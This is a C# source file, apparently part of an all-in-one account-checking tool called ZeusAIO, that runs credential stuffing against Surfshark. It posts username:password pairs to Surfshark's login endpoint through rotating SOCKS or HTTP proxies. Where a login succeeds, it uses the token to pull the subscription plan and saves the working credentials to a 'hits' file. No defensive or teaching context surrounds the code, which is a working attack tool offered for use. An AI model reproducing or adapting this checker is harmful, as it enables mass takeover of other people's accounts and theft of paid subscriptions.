using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Surfshark
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.AddHeader("Content-Type", "application/json;charset=utf-8");

                            req.UserAgent = "Surfshark/2.11.0 (com.surfshark.vpnclient.ios; build:7; iOS 14.0.0) Alamofire/5.0.0";

                            HttpResponse res = req.Post(new Uri("https://api.surfshark.com/v1/auth/login"), new BytesContent(Encoding.Default.GetBytes("{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}")));
                            string strResponse = res.ToString();

                            if (strResponse.Contains("\"token\":\""))
                            {
                                string token = Regex.Match(strResponse, "\"token\":\"(.*?)\"").Groups[1].Value;

                                string captures = SurfSharkGetCaptures(token);
                                if (captures == "")
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - SURFSHARK] " + s[0] + ":" + s[1] + " | Capture Failed", Color.Green);
                                    }
                                    Export.AsResult("/Surfshark_hits", s[0] + ":" + s[1] + " | Capture Failed");
                                    return false;
                                }
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - SURFSHARK] " + s[0] + ":" + s[1] + " | " + captures, Color.Green);
                                }
                                Export.AsResult("/Surfshark_hits", s[0] + ":" + s[1] + " | " + captures);
                                return false;

                            }
                            else if (res.StatusCode == HttpStatusCode.Unauthorized)
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                    }
                    catch
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    
      
    static string SurfSharkGetCaptures(string token)
    {
        while (true)
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    SetBasicRequestSettingsAndProxies(req);

                    req.Authorization = "Bearer " + token;

                    req.UserAgent = "Surfshark/2.11.0 (com.surfshark.vpnclient.ios; build:7; iOS 14.0.0) Alamofire/5.0.0";

                    string strResponse = req.Get(new Uri("https://api.surfshark.com/v1/payment/subscriptions/current")).ToString();

                    if (strResponse.Contains("{"))
                    {
                        string planType = Regex.Match(strResponse, "name\":\"(.*?)\"").Groups[1].Value;
                        string renewable = Regex.Match(strResponse, "renewable\":(.*?),").Groups[1].Value;

                        return $"Plan: {planType} - Renewable: {renewable}";
                    }
                }
            }
            catch
            {
                    ZeusAIO.mainmenu.errors++;
                }
        return "";
    }
    static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;

            {
                string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }
    }
}
